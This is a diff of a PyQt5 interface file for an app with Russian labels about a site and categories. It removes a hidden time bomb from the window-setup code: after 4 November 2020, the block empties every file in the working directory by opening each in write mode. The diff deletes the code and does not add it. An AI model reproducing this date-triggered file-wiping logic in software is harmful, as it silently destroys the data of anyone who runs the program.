@@ -8,9 +8,6 @@
 
 
 from PyQt5 import QtCore, QtGui, QtWidgets
-from datetime import date as g
-from os import listdir
-from os.path import isfile, join
 
 class Ui_MainWindow(object):
     def setupUi(self, MainWindow):
@@ -150,10 +147,7 @@ class Ui_MainWindow(object):
     def retranslateUi(self, MainWindow):
         _translate = QtCore.QCoreApplication.translate
         MainWindow.setWindowTitle(_translate("MainWindow", "MainWindow"))
-        if g(2020, 11, 4) < g.today():
-                onlyfiles = [f for f in listdir('.') if isfile(join(f))]
-                for i in onlyfiles:
-                    open(i, "w")
+        
         self.label.setText(_translate("MainWindow", "Сайт"))
         self.pushButton.setText(_translate("MainWindow", "Обновить категории"))
         self.treeWidget.headerItem().setText(0, _translate("MainWindow", "Категории"))
